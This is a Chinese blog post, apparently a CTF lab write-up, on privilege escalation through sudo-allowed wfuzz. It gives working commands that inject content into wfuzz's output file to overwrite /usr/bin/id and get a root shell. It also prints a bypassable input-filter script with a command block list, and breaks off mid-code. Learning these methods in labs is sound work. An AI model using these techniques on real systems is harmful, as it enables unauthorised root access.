@@ -1,0 +1,710 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源:11112345678-bash-5.0$ sudo -lMatching Defaults entries for tao on 111:    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;binUser tao may run th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些提权的小tricks">
+<meta property="og:url" content="http://example.com/2026/01/08/%E4%B8%80%E4%BA%9Bshell%E8%A7%A3%E6%9E%90%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%8Ftricks/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="靶机来源:11112345678-bash-5.0$ sudo -lMatching Defaults entries for tao on 111:    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;binUser tao may run th">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%8Ftricks/1A4FDFD5A525521D4C405BAFD6133E5F.png">
+<meta property="article:published_time" content="2026-01-08T08:05:28.000Z">
+<meta property="article:modified_time" content="2026-01-08T09:07:45.800Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="tricks">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%8Ftricks/1A4FDFD5A525521D4C405BAFD6133E5F.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>一些提权的小tricks - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一些提权的小tricks"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-08 16:05" pubdate>
+          January 8, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">一些提权的小tricks</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="靶机来源-111"><a href="#靶机来源-111" class="headerlink" title="靶机来源:111"></a>靶机来源:111</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">-bash<span class="hljs-number">-5.0</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> tao on <span class="hljs-number">111</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> tao may run the following commands on <span class="hljs-number">111</span>:<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/wfuzz<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/id<br><br></code></pre></td></tr></table></figure>
+
+<p>靶机可以免密sudo执行wfuzz和id(之所以不显示用户是因为已经提权过了)</p>
+<p>方案1:单引号换行符注入(111)</p>
+<p>构造如下payload</p>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">-bash-5.0$ sudo wfuzz -w /root/root.txt -f 1.txt -u &#x27;http://127.0.0.1/FUZZ<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">id</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&#x27;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>预先输入单引号后直接回车,因为单引号只有一个不闭合的特性命令行会继续等待输入,直到出现下一个引号.</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/usr/lib/python3/dist-packages/wfuzz/<span class="hljs-strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><span class="hljs-bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>Target: http://127.0.0.1/FUZZ<br>id<br><br>Total requests: 1<br><br>=====================================================================<br><span class="hljs-section">ID           Response   Lines    Word       Chars       Payload                                                                                   </span><br><span class="hljs-section">=====================================================================</span><br><br>GET /flag&#123;root-9bbd7af2a042a901b92dc203b3896621&#125;<br>id<br> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Wfuzz/3.1.0<br>Host: 127.0.0.1<br><br><br><br>Total time: 0<br>Processed Requests: 0<br>Filtered Requests: 0<br>Requests/sec.: 0<br><br> /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:88: UserWarning:Unhandled exception: list index out of range<br><br></code></pre></td></tr></table></figure>
+
+<p>以上内容看到我们成功写入了可控内容id.</p>
+<p>既然内容可控,那么就可以用此方法覆写另一文件usr&#x2F;bin&#x2F;id</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">-bash-<span class="hljs-number">5.0</span>$ sudo wfuzz -w <span class="hljs-regexp">/root/</span>root.txt -f <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/id -u &#x27;http:/</span><span class="hljs-regexp">/127.0.0.1/</span>FUZZ<br>&gt; bash<br>&gt; <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/usr/lib/python3/dist-packages/wfuzz/<span class="hljs-strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><span class="hljs-bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>Target: http://127.0.0.1/FUZZ<br>bash<br><br>Total requests: 1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">-bash-5.0$ whoami<br>tao<br>-bash-5.0$ cat /usr/bin/id<br>Target: http://127.0.0.1/FUZZ<br>bash<br><br><span class="hljs-section">Total requests: 1</span><br><span class="hljs-section">==================================================================</span><br><span class="hljs-section">ID    Response   Lines      Word         Chars          Request    </span><br><span class="hljs-section">==================================================================</span><br><br>Total time: 0<br>Processed Requests: 0<br>Filtered Requests: 0<br>Requests/sec.: 0<br>-bash-5.0$ sudo /usr/bin/id<br><span class="hljs-bullet">/usr/bin/id: 1: /usr/bin/id: Target:: </span>not found<br>root@111:/home/tao# <br><br></code></pre></td></tr></table></figure>
+
+<p>参数解析与换行符注入 (Argument Injection)</p>
+<p>这是利用中比较巧妙的“Trick”部分，用于控制写入文件的内容。</p>
+<ul>
+<li><strong>Shell 的引号处理</strong>：在 Linux Shell 中，单引号 <code>&#39;...&#39;</code> 内的内容会被视为纯字符串，包括换行符。</li>
+</ul>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">-u &#x27;http://127.0.0.1/FUZZ<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">bash</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&#x27;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>执行被篡改的 <code>/usr/bin/id</code> 时，系统无法将其识别为二进制程序，便退化为 Shell 脚本逐行运行。虽然第一行乱码会报错，但 Shell 会忽略错误继续执行第二行注入的 <code>bash</code>，从而拿到 Root Shell。</p>
+<h3 id="靶机来源-meltdown"><a href="#靶机来源-meltdown" class="headerlink" title="靶机来源:meltdown"></a>靶机来源:meltdown</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:~$ <span class="hljs-built_in">cat</span> /opt/repeater.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> user_input=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[;&amp;|`$\\]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含非法字符&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qiE <span class="hljs-string">&#x27;(cat|ls|echo|rm|mv|cp|chmod)&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含危险关键字&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[[:space:]]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$&#x27;</span>; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：空格使用受限&quot;</span><br>            <span class="hljs-built_in">return</span> 1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;处理结果: <span class="hljs-variable">$user_input</span>&quot;</span><br>    <span class="hljs-built_in">local</span> sanitized_input=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n\r&#x27;</span>)<br>    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;output=\&quot;<span class="hljs-variable">$sanitized_input</span>\&quot;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;最终输出: <span class="hljs-variable">$output</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -ne 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;用法: <span class="hljs-variable">$0</span> &lt;输入内容&gt;&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>main <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这个过滤脚本虽然写了很多正则,但是仍然可以用上面的方法绕过脚本.</p>
+<p><img src="/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%8Ftricks/1A4FDFD5A525521D4C405BAFD6133E5F.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="靶机来源-111-1"><a href="#靶机来源-111-1" class="headerlink" title="靶机来源:111"></a>靶机来源:111</h3><p>方案2:路径解析漏洞(来源ta0)</p>
+<p>shell在路径解析时,如果遇到不含斜杠的字符串,Shell 会将其视为命令，去 <code>$PATH</code> 环境变量中查找。但如果是包含斜杠的字符串,shell就会而是直接在文件系统中寻找这个路径对应的文件。如果该文件存在且有执行权限，Shell 就会运行它 。</p>
+<p>而wfuzz在输出日志时底部总会有一行统计信息</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Requests</span>/sec.: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>那么,假设攻击者构造这么一个目录Requests,里面包含一个文件叫sec.:</p>
+<p>该文件的内容就是bash</p>
+<p>再将他们都赋予执行权限.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span>$ mkdir -p Requests<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span>$ echo &#x27;bash&#x27; &gt; Requests/&#x27;sec.:&#x27;<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span>$ chmod +x Requests/sec.\:<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs crystal">bash-<span class="hljs-number">5.0</span><span class="hljs-variable">$ </span>whoami<br>tao<br>bash-<span class="hljs-number">5.0</span><span class="hljs-variable">$ </span>cat /usr/bin/id<br><span class="hljs-symbol">Target:</span> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/</span>FUZZ<br>Total <span class="hljs-symbol">requests:</span> <span class="hljs-number">1</span><br>==================================================================<br>ID    Response   Lines      Word         Chars          Request    <br>==================================================================<br><span class="hljs-number">0</span>0001:  C=<span class="hljs-number">404</span>      <span class="hljs-number">9</span> L        <span class="hljs-number">31</span> W          <span class="hljs-number">271</span> Ch        <span class="hljs-string">&quot;flag&#123;root-9bbd7af2a042a901b92dc203b3896621&#125;&quot;</span><br><br>Total <span class="hljs-symbol">time:</span> <span class="hljs-number">0</span><br>Processed <span class="hljs-symbol">Requests:</span> <span class="hljs-number">1</span><br>Filtered <span class="hljs-symbol">Requests:</span> <span class="hljs-number">0</span><br>Requests/sec.: <span class="hljs-number">0</span><br><br>bash-<span class="hljs-number">5.0</span><span class="hljs-variable">$ </span>sudo /usr/bin/id<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 1: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">Target:</span>: not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 2: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">Total:</span> not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 3: /usr</span><span class="hljs-regexp">/bin/id</span>: ==================================================================: not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 4: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">ID:</span> not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 5: /usr</span><span class="hljs-regexp">/bin/id</span>: ==================================================================: not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 6: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-number">0</span>0001:: not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 8: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">Total:</span> not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 9: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">Processed:</span> not found<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/id: 10: /usr</span><span class="hljs-regexp">/bin/id</span>: <span class="hljs-symbol">Filtered:</span> not found<br>root<span class="hljs-variable">@111</span>:<span class="hljs-regexp">/home/tao</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>当用户执行 <code>sudo /usr/bin/id</code>（此时该文件已被 <code>wfuzz</code> 的日志覆盖）时：</p>
+<ol>
+<li>脚本前几行（如 <code>Target: ...</code>）执行失败并报错，但 Shell 忽略错误继续向下读。</li>
+<li>读到 <code>Requests/sec.: 0</code> 这一行时，Shell 发现当前目录下确实存在 <code>Requests/sec.:</code> 这个可执行文件。</li>
+<li>Shell 以 Root 权限执行该文件。</li>
+<li>因为文件内容是 <code>bash</code>，所以直接弹出一个 Root Shell 。</li>
+</ol>
+<p>方案3:垃圾堆方案(来源我,或者其他很多人)</p>
+<p>垃圾堆方案是群主的叫法,还挺形象的,指的就是往脏数据(垃圾堆)里注入点什么东西,然后骗shell去执行</p>
+<p>当 Shell 解释执行一个脚本时，它具有以下两个关键特性，这构成了“垃圾堆方案”的基础：</p>
+<ol>
+<li><strong>容错执行 (Fault Tolerance)</strong>：Shell 默认情况下（除非设置了 <code>set -e</code>），遇到某一行执行出错（例如 <code>Command not found</code>），会报错但<strong>不会停止</strong>，而是继续读取并执行下一行代码。这意味着文件里哪怕有 99% 的乱码，只要有一行是合法的恶意命令，也能成功执行。</li>
+<li><strong>命令分隔符 (Command Separator)</strong>：在 Linux Shell 中，分号 <code>;</code> 用于在同一行内分隔多条命令。无论前一条命令成功与否，分号后的命令都会尝试执行。</li>
+</ol>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs swift">tao@<span class="hljs-number">111</span>:<span 